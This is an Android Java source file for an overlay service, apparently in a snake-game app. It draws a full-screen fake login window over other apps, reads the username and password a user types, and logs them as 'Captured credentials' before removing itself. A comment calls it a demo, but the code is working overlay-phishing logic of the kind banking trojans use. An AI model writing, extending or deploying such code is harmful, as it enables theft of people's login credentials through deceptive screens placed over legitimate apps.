package com.example.snake;

import android.app.Service;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;

import androidx.annotation.Nullable;

public class OverlayService extends Service {

    private WindowManager windowManager;
    private View overlayView;

    @Override
    public void onCreate() {
        super.onCreate();

        // Inflate the overlay layout
        overlayView = LayoutInflater.from(this).inflate(R.layout.overlay_layout, null);

        // Set up layout parameters for the overlay
        int layoutFlag;
        layoutFlag = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                layoutFlag,
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                PixelFormat.TRANSLUCENT
        );

        params.gravity = Gravity.TOP | Gravity.START;

        // Add the view to the window
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        windowManager.addView(overlayView, params);

        // Set up the login button to remove overlay
        Button loginButton = overlayView.findViewById(R.id.loginButton);
        EditText usernameField = overlayView.findViewById(R.id.usernameField);
        EditText passwordField = overlayView.findViewById(R.id.passwordField);

        loginButton.setOnClickListener(v -> {
            String username = usernameField.getText().toString();
            String password = passwordField.getText().toString();

            // Demo purposes: log the captured input
            Log.d("Snake", "Captured credentials: " + username + " / " + password);

            // Remove overlay and stop the service
            if (windowManager != null && overlayView != null) {
                windowManager.removeView(overlayView);
                overlayView = null;
            }
            stopSelf();
        });
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (windowManager != null && overlayView != null) {
            windowManager.removeView(overlayView);
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
